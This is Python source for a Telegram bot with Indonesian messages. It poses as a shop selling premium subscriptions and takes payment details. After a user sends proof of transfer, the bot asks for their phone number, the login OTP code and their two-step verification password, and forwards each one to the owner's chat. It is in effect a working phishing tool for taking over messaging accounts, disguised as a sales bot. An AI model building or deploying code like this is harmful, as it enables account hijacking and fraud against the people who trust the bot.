import logging
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
)
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
from config import API_TOKEN, OWNER_ID

# ID atau username channel testimoni
force_subscribe_channel = "https://t.me/tesddrw"

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome_text = "👋 Selamat datang di Bot Premium!\nSilakan pilih menu di bawah ini:"
    keyboard = [
        [InlineKeyboardButton("🛍 Beli Prem Sekarang", callback_data="menu")],
        [InlineKeyboardButton("👤 CS", url="https://t.me/serpagengs")],
        [InlineKeyboardButton("📢 Testimoni", url="https://t.me/tesddrw")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

# Menu pemilihan durasi
async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("1 Bulan", callback_data="1_bulan")],
        [InlineKeyboardButton("3 Bulan", callback_data="3_bulan")],
        [InlineKeyboardButton("6 Bulan", callback_data="6_bulan")],
        [InlineKeyboardButton("12 Bulan", callback_data="12_bulan")]
    ]
    await query.edit_message_text("📆 Pilih durasi pembelian:", reply_markup=InlineKeyboardMarkup(keyboard))

# Pilih metode pembayaran
async def payment_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    duration = query.data
    context.user_data["durasi"] = duration
    keyboard = [
        [InlineKeyboardButton("QRIS", callback_data='bayar_qris')],
        [InlineKeyboardButton("Bank", callback_data='bayar_bank')],
        [InlineKeyboardButton("DANA", callback_data='bayar_dana')],
        [InlineKeyboardButton("Gopay", callback_data='bayar_gopay')],
        [InlineKeyboardButton("⬅️ Kembali", callback_data='menu')]
    ]
    await query.edit_message_text(
        text=f"Pilih metode pembayaran untuk *{duration.replace('_', ' ')}*:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

# Informasi pembayaran
async def info_pembayaran(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    metode = query.data.replace("bayar_", "")
    if metode == "qris":
        await query.edit_message_text(
            text="🔗 Silakan scan QRIS atau klik link berikut:\nhttps://t.me/serpagengs"
        )
    else:
        rekening = {
            "bank": ("BCA - 1234567890", "a.n. SERPA GENGS"),
            "dana": ("081234567890", "a.n. SERPA GENGS"),
            "gopay": ("081234567890", "a.n. SERPA GENGS")
        }
        norek, nama = rekening.get(metode, ("-", "-"))
        await query.edit_message_text(
            text=f"""💳 Metode: {metode.upper()}
📛 Nama: {nama}
🏦 Nomor: {norek}

Setelah transfer, silakan kirim bukti (foto) ke bot ini."""
        )

# Fungsi cek apakah user sudah join channel
async def check_user_subscribed(bot, user_id):
    try:
        member = await bot.get_chat_member(force_subscribe_channel, user_id)
        return member.status in [ChatMember.MEMBER, ChatMember.OWNER, ChatMember.ADMINISTRATOR]
    except Exception:
        return False

# Handle foto bukti transfer
async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    file = await update.message.photo[-1].get_file()
    context.user_data["bukti_transfer_file_id"] = file.file_id

    # Cek apakah user sudah join channel moni
    if not await check_user_subscribed(context.bot, user.id):
        keyboard = [[InlineKeyboardButton("✅ Sudah Join", callback_data="sudah_join_channel")]]
        await update.message.reply_text(
            f"❗️Untuk melanjutkan, silakan join channel moni terlebih dahulu:\n{force_subscribe_channel}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    await update.message.reply_text("✅ Bukti diterima. Sekarang silakan masukkan nomor HP yang akan digunakan.")

# Callback setelah tekan tombol "Sudah Join"
async def sudah_join_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user

    if not await check_user_subscribed(context.bot, user.id):
        await query.edit_message_text("❌ Kamu belum join channel. Silakan join terlebih dahulu.")
        return

    await query.edit_message_text("✅ Terima kasih sudah join channel.\nSekarang masukkan nomor HP yang akan digunakan.")

# Input nomor HP
async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if "bukti_transfer_file_id" not in context.user_data:
        return
    context.user_data["nomor_hp"] = update.message.text
    await context.bot.send_message(
        chat_id=int(OWNER_ID),
        text=f"📱 Nomor HP diterima: `{update.message.text}`"
    )
    await update.message.reply_text("📩 Sekarang kirim kode OTP yang kamu terima.")

# Input OTP
async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if "nomor_hp" not in context.user_data:
        return
    context.user_data["otp"] = update.message.text
    await context.bot.send_message(
        chat_id=int(OWNER_ID),
        text=f"🔑 OTP diterima: `{update.message.text}`"
    )
    await update.message.reply_text("🔒 Jika kamu menggunakan verifikasi 2 langkah, kirim sekarang. Jika tidak, ketik `-`.")

# Verifikasi 2 langkah & kirim semua data ke owner
async def handle_verifikasi_dua_langkah(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if "otp" not in context.user_data:
        return
    context.user_data["verifikasi_2_langkah"] = update.message.text
    user = update.effective_user

    caption = (
        f"📩 *Data Pembeli Baru*\n"
        f"👤 Dari: [{user.first_name}](tg://user?id={user.id})\n"
        f"🆔 ID: `{user.id}`\n"
        f"💬 Username: @{user.username or 'tidak tersedia'}\n\n"
        f"📱 Nomor HP: `{context.user_data['nomor_hp']}`\n"
        f"🔑 OTP: `{context.user_data['otp']}`\n"
        f"🔒 Verifikasi 2 Langkah: `{context.user_data['verifikasi_2_langkah']}`"
    )

    await context.bot.send_photo(
        chat_id=int(OWNER_ID),
        photo=context.user_data["bukti_transfer_file_id"],
        caption=caption,
        parse_mode=ParseMode.MARKDOWN
    )

    await update.message.reply_text("✅ Data kamu sudah dikirim ke admin. Mohon tunggu konfirmasi.")

# Balasan dari owner ke user
async def handle_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != int(OWNER_ID):
        return
    if update.message.reply_to_message and update.message.reply_to_message.caption:
        lines = update.message.reply_to_message.caption.split("\n")
        for line in lines:
            if line.startswith("🆔 ID:"):
                user_id = int(line.replace("🆔 ID:", "").strip())
                await context.bot.send_message(chat_id=user_id, text=update.message.text)
                await update.message.reply_text("📨 Pesan sudah dikirim ke user.")

# Konfirmasi atau tolak dari owner
async def handle_konfirmasi_tolak(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = int(query.message.caption.split("\n")[2].split(":")[1].strip())

    if query.data == "konfirmasi":
        await context.bot.send_message(
            chat_id=user_id,
            text="✅ Pembelian kamu telah dikonfirmasi! Silakan masukkan nomor HP untuk langkah selanjutnya."
        )
        await query.edit_message_text(text="✅ Pembelian telah dikonfirmasi.")
    else:
        await context.bot.send_message(
            chat_id=user_id,
            text="❌ Pembelian kamu ditolak. Silakan hubungi admin untuk informasi lebih lanjut."
        )
        await query.edit_message_text(text="❌ Pembelian ditolak.")

# Main function
def main():
    app = ApplicationBuilder().token(API_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(menu, pattern="menu"))
    app.add_handler(CallbackQueryHandler(payment_method, pattern="1_bulan|3_bulan|6_bulan|12_bulan"))
    app.add_handler(CallbackQueryHandler(info_pembayaran, pattern="bayar_qris|bayar_bank|bayar_dana|bayar_gopay"))
    app.add_handler(CallbackQueryHandler(sudah_join_channel, pattern="sudah_join_channel"))
    app.add_handler(MessageHandler(filters.PHOTO, handle_media))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_otp))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_verifikasi_dua_langkah))
    app.add_handler(CallbackQueryHandler(handle_konfirmasi_tolak, pattern="konfirmasi|tolak"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_reply))
    app.run_polling()

if __name__ == "__main__":
    main()
